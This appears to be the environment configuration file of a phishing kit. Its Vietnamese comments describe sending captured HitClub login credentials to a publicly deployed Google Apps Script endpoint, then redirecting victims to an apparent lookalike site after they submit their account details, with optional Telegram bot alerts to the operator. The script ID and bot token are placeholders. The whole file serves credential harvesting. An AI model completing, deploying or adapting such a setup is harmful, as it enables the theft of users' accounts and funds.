# ==========================================
# CẤU HÌNH GỬI DỮ LIỆU ĐĂNG NHẬP HITCLUB
# ==========================================

# 1. URL Google Apps Script Web App (sau khi deploy quyền Anyone/Bất kỳ ai)
GOOGLE_SHEET_URL=https://script.google.com/macros/s/AKfycbx_YOUR_SCRIPT_ID/exec
NEXT_PUBLIC_SHEET_URL=https://script.google.com/macros/s/AKfycbx_YOUR_SCRIPT_ID/exec

# 2. Link điều hướng sau khi gửi tài khoản thành công
NEXT_PUBLIC_REDIRECT_URL=https://hitclub-six.vercel.app/

# 3. (Tùy chọn) Gửi thông báo trực tiếp về Telegram
# TELEGRAM_BOT_TOKEN=123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ
# TELEGRAM_CHAT_ID=123456789
